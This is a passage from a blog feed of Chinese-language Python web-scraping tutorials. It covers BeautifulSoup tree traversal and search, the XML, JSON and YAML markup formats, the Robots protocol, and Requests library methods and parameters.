class="string">&#x27;http://www.icourse163.org/course/BIT-268001&#x27;</span>, <span class="string">&#x27;class&#x27;</span>: [<span class="string">&#x27;py1&#x27;</span>], <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;link1&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>返回一个字典，如标签没有属性则返回空字典。</p><p>4.通过Tag.string来获得标签中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a</span><br><span class="line">&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.string</span><br><span class="line"><span class="string">&#x27;Basic Python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.p</span><br><span class="line">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.p.string</span><br><span class="line"><span class="string">&#x27;The demo python introduces several python courses.&#x27;</span></span><br></pre></td></tr></table></figure><p>5.NavigableString和Comment  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>newsoup = BeautifulSoup(<span class="string">&quot;&lt;p&gt;&lt;!--a--&gt;&lt;/p&gt;&lt;b&gt;a&lt;/b&gt;&quot;</span>,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>newsoup.p.string</span><br><span class="line"><span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(newsoup.p.string)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Comment</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">newsoup</span>.<span class="title">b</span>.<span class="title">string</span></span></span><br><span class="line"><span class="class">&#x27;<span class="title">a</span>&#x27;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span>(<span class="params">newsoup.b.string</span>)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">NavigableString</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>了解即可</p><h2 id="利用bs4库遍历HTML内容"><a href="#利用bs4库遍历HTML内容" class="headerlink" title="利用bs4库遍历HTML内容"></a>利用bs4库遍历HTML内容</h2><h3 id="标签树的下行遍历"><a href="#标签树的下行遍历" class="headerlink" title="标签树的下行遍历"></a>标签树的下行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.contents</td><td align="center">子节点的列表，将<tag>所有儿子节点存入列表</td></tr><tr><td align="center">.children</td><td align="center">子节点的迭代类型，与.contents类似，用于循环遍历儿子节点</td></tr><tr><td align="center">.descendants</td><td align="center">子孙节点的迭代类型，包含所有子孙节点，用于循环遍历</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.head</span><br><span class="line">&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.head.contents</span><br><span class="line">[&lt;title&gt;This is a python demo page&lt;/title&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span class="line">print(child)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.descendants:</span><br><span class="line">print(child)</span><br></pre></td></tr></table></figure><h3 id="标签树的上行遍历"><a href="#标签树的上行遍历" class="headerlink" title="标签树的上行遍历"></a>标签树的上行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.parent</td><td align="center">节点的父亲标签</td></tr><tr><td align="center">.parents</td><td align="center">节点先辈标签的迭代类型，用于循环遍历先辈节点</td></tr></tbody></table><p>parents用于遍历父节点，父节点的父节点…  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line"><span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">print(parent)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(parent.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p</span><br><span class="line">body</span><br><span class="line">html</span><br><span class="line">[document]</span><br></pre></td></tr></table></figure><h3 id="标签树的平行遍历"><a href="#标签树的平行遍历" class="headerlink" title="标签树的平行遍历"></a>标签树的平行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.next_sibling</td><td align="center">返回按照HTML文本顺序的下一个平行节点标签</td></tr><tr><td align="center">.previous_sibling</td><td align="center">返回按照HTML文本顺序的上一个平行节点标签</td></tr><tr><td align="center">.next_siblings</td><td align="center">迭代类型，返回按照HTML文本顺序的后续所有平行节点标签</td></tr><tr><td align="center">.previous_siblings</td><td align="center">迭代类型，返回按照HTML文本顺序的前续所有平行节点标签</td></tr></tbody></table><p>next_sibling和previous_sibling同理</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a</span><br><span class="line">&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.next_sibling</span><br><span class="line"><span class="string">&#x27; and &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.next_sibling.next_sibling</span><br><span class="line">&lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>而.next_siblings和.previous_siblings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_sibling: </span><br><span class="line">print(sibling)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_sibling:</span><br><span class="line">print(sibling)</span><br></pre></td></tr></table></figure><p>需要注意的是：同一个父标签的节点才构成平行关系，例如&lt;head&gt;标签下的节点和&lt;body&gt;下的节点不构成平行关系</p><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><p>通过这些属性生成器生成的节点可迭代对象中，不仅仅是包含尖括号&lt;&gt;的标签，还有一些字符内容,如&#39;\n&#39;以及标签中的没有被标签包裹的字符串(懂我意思吗)，这些都可以是节点。</p><h2 id="格式化与编码"><a href="#格式化与编码" class="headerlink" title="格式化与编码"></a>格式化与编码</h2><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>前面讲了prettify()方法可以对文本进行美化排版，它不仅支持BeautifulSoup类，还可以对标签的内容进行排版。（实际上BeautifulSoup类对应的就是标签树的根节点）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.p</span><br><span class="line">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.p.prettify())</span><br><span class="line">&lt;p class=&quot;title&quot;&gt;</span><br><span class="line"> &lt;b&gt;</span><br><span class="line">  The demo python introduces several python courses.</span><br><span class="line"> &lt;/b&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>BeautifulSoup对所有传入的HTML文档或者字符串都会转换为UTF-8编码。</p><h1 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h1><h2 id="信息标记"><a href="#信息标记" class="headerlink" title="信息标记"></a>信息标记</h2><p>XML,JSON,YAML</p><p>1.XML<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>...<span class="tag">&lt;/<span class="name">name</span>&gt;</span> //标签中有内容时</span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>/&gt;</span> //标签中无内容时</span><br><span class="line"><span class="comment">&lt;!--  --&gt;</span> //注释</span><br></pre></td></tr></table></figure><br>2.JSON<br>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;key&quot;</span> : <span class="string">&quot;value&quot;</span>,</span><br><span class="line"><span class="attr">&quot;key1&quot;</span> : [<span class="string">&quot;value1&quot;</span>,<span class="string">&quot;value2&quot;</span>],</span><br><span class="line"><span class="attr">&quot;key2&quot;</span> : &#123;<span class="attr">&quot;subkey&quot;</span> : <span class="string">&quot;subvalue&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>3.YAML<br>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无类型键值对</span></span><br><span class="line"><span class="attr">key :</span> <span class="string">value</span></span><br><span class="line"><span class="attr">key1 :</span> <span class="comment">#注释</span></span><br><span class="line"><span class="string">-value1</span>  <span class="comment">#并列</span></span><br><span class="line"><span class="string">-value2</span></span><br><span class="line"><span class="attr">key2 :</span></span><br><span class="line">    <span class="attr">subkey :</span> <span class="string">subvalue</span>  <span class="comment">#嵌套</span></span><br></pre></td></tr></table></figure></p><hr><blockquote><p>XML：最早通用信息标记语言，可拓展性好，繁琐。<br><br>JSON：信息有类型，适合程序处理（js），较XML简洁<br><br>YAML：信息无类型，文本信息比例最高，可读性好。</p></blockquote><h2 id="信息提取方法"><a href="#信息提取方法" class="headerlink" title="信息提取方法"></a>信息提取方法</h2><ol><li><p>先解析信息的标记形式，再提取关键信息<br>需要<strong>标记解析器</strong>  </p><p>优点：信息解析准确<br>缺点：提取繁琐，速度慢  </p></li><li><p>无视标记形式，直接搜索关键信息  </p><p>需要<strong>搜索函数</strong>  </p><p>优点：过程简洁，速度快<br>缺点：提取结果准确性和信息内容相关  </p></li></ol><p><strong>两者结合就完事了</strong></p><h3 id="实例：提取页面所有链接"><a href="#实例：提取页面所有链接" class="headerlink" title="实例：提取页面所有链接"></a>实例：提取页面所有链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">&quot;http://python123.io/ws/demo.html&quot;</span>)</span><br><span class="line">demo = r.text</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(demo.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">print(link.get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://www.icourse163.org/course/BIT-<span class="number">268001</span></span><br><span class="line">http://www.icourse163.org/course/BIT-<span class="number">1001870001</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h2 id="查找函数"><a href="#查找函数" class="headerlink" title="查找函数"></a>查找函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;.find_all(name,attrs,recursive, string, **kwargs)  <span class="comment">#返回一个由搜索结果组成的列表</span></span><br></pre></td></tr></table></figure><ul><li>name : 对标签名称的检索字符串  </li><li>attrs: 对标签属性值的检索字符串，可标注属性检索  </li><li>recursive: 是否对子孙全部检索，默认True  </li><li>string: &lt;&gt;…&lt;/&gt;中字符串区域的检索字符串</li></ul><p><strong>拓展方法</strong></p><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&lt;&gt;.find()</td><td align="center">搜索且只返回一个结果，同.find_all()参数</td></tr><tr><td align="center">&lt;&gt;.find_parents()</td><td align="center">在先辈节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td align="center">&lt;&gt;.find_parent()</td><td align="center">在先辈节点中返回一个结果，同.find()参数</td></tr><tr><td align="center">&lt;&gt;.find_next_siblings()</td><td align="center">在后续平行节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td align="center">&lt;&gt;.find_next_sibling()</td><td align="center">在后续平行节点中返回一个结果，同.find()参数</td></tr><tr><td align="center">&lt;&gt;.find_previous_siblings()</td><td align="center">在前序平行节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td align="center">&lt;&gt;.find_previous_sibling()</td><td align="center">在前序平行节点中返回一个结果，同.find()参数</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;BeautifulSoup库&quot;&gt;&lt;a href=&quot;#BeautifulSoup库&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup库&quot;&gt;&lt;/a&gt;BeautifulSoup库&lt;/h1&gt;&lt;h2 id=&quot;简单使用&quot;&gt;&lt;a href=&quot;#简单使用&quot; class=&quot;headerlink&quot; title=&quot;简单使用&quot;&gt;&lt;/a&gt;简单使用&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; bs4 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;p&amp;gt;python&amp;lt;/p&amp;gt;&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;html.parser&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫--Robots协议</title>
    <link href="https://sncker.github.io/blog/2019/07/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Robots%E5%8D%8F%E8%AE%AE/"/>
    <id>https://sncker.github.io/blog/2019/07/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Robots%E5%8D%8F%E8%AE%AE/</id>
    <published>2019-07-21T10:23:00.000Z</published>
    <updated>2020-01-02T12:31:21.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h1><p><strong>Robots Exclusion Standard</strong>，网络爬虫排除标准  </p><p>这东西搁以前我觉得就是放屁，但是看着一些圈子内的大佬莫名失踪（网安）自己着实对网络法规产生了敬畏。  </p><p>总的来说，Robots协议是建议，遵不遵守看个人，当不遵守时就会存在<strong>法律风险</strong>。  </p><p>当然，网站就是为了提供服务的，像新闻这种本来就是给人看的，一个人十秒钟浏览一次，爬虫也可以如此。  </p><p>所以原则就是：<strong>类人行为可不参考Robots协议。</strong></p><a id="more"></a><p><strong>附表:</strong></p><table><thead><tr><th align="center">目的</th><th align="center">遵守建议</th></tr></thead><tbody><tr><td align="center">爬取网页</td><td align="center">访问量小：可以遵守<br>访问量大：建议遵守</td></tr><tr><td align="center">爬取系列网站</td><td align="center">非商业且偶尔：建议遵守<br>商业利益：必须遵守</td></tr><tr><td align="center">爬取全网</td><td align="center">必须遵守</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Robots协议&quot;&gt;&lt;a href=&quot;#Robots协议&quot; class=&quot;headerlink&quot; title=&quot;Robots协议&quot;&gt;&lt;/a&gt;Robots协议&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Robots Exclusion Standard&lt;/strong&gt;，网络爬虫排除标准  &lt;/p&gt;
&lt;p&gt;这东西搁以前我觉得就是放屁，但是看着一些圈子内的大佬莫名失踪（网安）自己着实对网络法规产生了敬畏。  &lt;/p&gt;
&lt;p&gt;总的来说，Robots协议是建议，遵不遵守看个人，当不遵守时就会存在&lt;strong&gt;法律风险&lt;/strong&gt;。  &lt;/p&gt;
&lt;p&gt;当然，网站就是为了提供服务的，像新闻这种本来就是给人看的，一个人十秒钟浏览一次，爬虫也可以如此。  &lt;/p&gt;
&lt;p&gt;所以原则就是：&lt;strong&gt;类人行为可不参考Robots协议。&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫--Requests库</title>
    <link href="https://sncker.github.io/blog/2019/07/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Requests%E5%BA%93/"/>
    <id>https://sncker.github.io/blog/2019/07/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Requests%E5%BA%93/</id>
    <published>2019-07-20T10:49:00.000Z</published>
    <updated>2020-01-02T12:31:33.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h1><h2 id="7个主要方法"><a href="#7个主要方法" class="headerlink" title="7个主要方法"></a>7个主要方法</h2><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.request()</td><td align="center">构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td align="center">requests.get()</td><td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td align="center">requests.head()</td><td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td align="center">requests.post()</td><td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td align="center">requests.put()</td><td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td align="center">requests.patch()</td><td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td align="center">requests.delete()</td><td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><p>与HTTP协议一一对应  </p><a id="more"></a><h3 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(url) //构造Request对象，返回Response对象</span><br><span class="line">print(r.status_code) //打印状态码</span><br></pre></td></tr></table></figure><h3 id="重要方法-requests-request"><a href="#重要方法-requests-request" class="headerlink" title="重要方法 : requests.request()"></a>重要方法 : requests.request()</h3><blockquote><p><strong>原型</strong> : requests.request(method,url,**kwargs)<br><strong>method</strong>   : 对应http的七种请求方法:get,post,put,delete等<br><strong>url</strong>      : 请求的url链接<br><strong>**kwargs</strong> : 控制访问的参数  </p></blockquote><p>当查看其它方法，如get()、post()的源代码时，可以发现它们其实都是对request()方法的封装。</p><h3 id="常用方法-get-head-post"><a href="#常用方法-get-head-post" class="headerlink" title="常用方法 : get() , head() , post()"></a>常用方法 : get() , head() , post()</h3><p>因为安全的原因，一般不会支持对url资源的操作，所以像put,delete,patch,option请求都不常用。</p><h4 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a>requests.get()</h4><blockquote><p><strong>原型</strong> : requests.get(url,params=None,**kwargs)<br><strong>url</strong>   : 请求的url链接<br><strong>params</strong> : url中的额外参数，字典或字节流格式，可选<br><strong>**kwargs</strong> : 控制访问的参数  </p></blockquote><p>get请求方式因为参数是显式存在于url上所有传参可以这样写<br><strong>方法一：</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;https://www.baidu.com/s?wd=python&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.url)</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;https://www.baidu.com/s&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">      <span class="string">&quot;wd&quot;</span>:<span class="string">&quot;python&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url,params=params)</span><br><span class="line">print(r.url)</span><br></pre></td></tr></table></figure><p>两种方法执行结果都是<br><a href="https://www.baidu.com/s?wd=python">https://www.baidu.com/s?wd=python</a></p><h4 id="requests-post"><a href="#requests-post" class="headerlink" title="requests.post()"></a>requests.post()</h4><blockquote><p><strong>原型</strong> : requests.post(url,data=None, json=None, **kwargs)<br><strong>url</strong> : 请求的url链接<br><strong>data</strong> : 请求的内容，可以是字典，字节序列或文件<br><strong>json</strong> : JSON格式数据，也是请求的内容<br><strong>**kwargs</strong> : 控制访问的参数  </p></blockquote><p>当POST字典时  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = ...</span><br><span class="line">payload = &#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span><br><span class="line">r=requests.post(url,data = payload)</span><br></pre></td></tr></table></figure><p>会自动编码成form表单</p><p>当POST字符串时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = ...</span><br><span class="line">r = requests.post(url,data = <span class="string">&quot;abc&quot;</span>)</span><br></pre></td></tr></table></figure><p>会自动编码成data</p><h4 id="requests-head"><a href="#requests-head" class="headerlink" title="requests.head()"></a>requests.head()</h4><blockquote><p><strong>原型</strong> : requests.head(url, **kwargs)<br><strong>url</strong> : 请求的url链接<br><strong>**kwargs</strong> : 控制访问的参数  </p></blockquote><p>只要header时使用</p><h3 id="控制访问参数"><a href="#控制访问参数" class="headerlink" title="控制访问参数"></a>控制访问参数</h3><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">params</td><td align="center">字典或字节序列，作为参数增加到url中</td></tr><tr><td align="center">data(常用)</td><td align="center">字典、字节序列或文件对象，作为Request的内容</td></tr><tr><td align="center">json</td><td align="center">JSON格式的数据，作为Request的内容</td></tr><tr><td align="center">headers(常用)</td><td align="center">字典，HTTP定制头</td></tr><tr><td align="center">cookies(常用)</td><td align="center">字典或CookieJar，Request中的cookie</td></tr><tr><td align="center">auth</td><td align="center">元组，支持HTTP认证功能</td></tr><tr><td align="center">files</td><td align="center">字典类型，传输文件</td></tr><tr><td align="center">timeout</td><td align="center">设定超时时间，秒为单位</td></tr><tr><td align="center">proxies(常用)</td><td align="center">字典类型，设定访问代理服务器，可以增加登录认证</td></tr><tr><td align="center">allow_redirects</td><td align="center">True/False，默认为True，重定向开关</td></tr><tr><td align="center">stream</td><td align="center">True/False，默认为True，获取内容立即下载开关</td></tr><tr><td align="center">verify</td><td align="center">True/False，默认为True，认证SSL证书开关</td></tr><tr><td align="center">cert</td><td align="center">本地SSL证书路径</td></tr></tbody></table><h4 id="headers选项"><a href="#headers选项" class="headerlink" title="headers选项"></a>headers选项</h4><p>自定义head头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hd = &#123;<span class="string">&#x27;user‐agent&#x27;</span>: <span class="string">&#x27;Chrome/10&#x27;</span>&#125; </span><br><span class="line">r = requests.request(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://www.baidu.com&#x27;</span>,headers = hd)</span><br></pre></td></tr></table></figure><h4 id="cookies选项"><a href="#cookies选项" class="headerlink" title="cookies选项"></a>cookies选项</h4><p>带cookies访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ck = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125; </span><br><span class="line">r = requests.request(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://www.baidu.com&#x27;</span>,cookies = ck)</span><br></pre></td></tr></table></figure><h4 id="proxies选项"><a href="#proxies选项" class="headerlink" title="proxies选项"></a>proxies选项</h4><p>设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pxs = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://user:pass@10.10.10.1:1234&#x27;</span> </span><br><span class="line"><span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://10.10.10.1:4321&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.request(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://www.baidu.com&#x27;</span>,proxies = pxs)</span><br></pre></td></tr></table></figure><h2 id="Response对象"><a href="#Response对象" class="headerlink" title="Response对象"></a>Response对象</h2><p>可以在交互式窗口使用dir(object)查看对象的属性和方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;r=requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">dir</span>(r)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r.headers</td><td 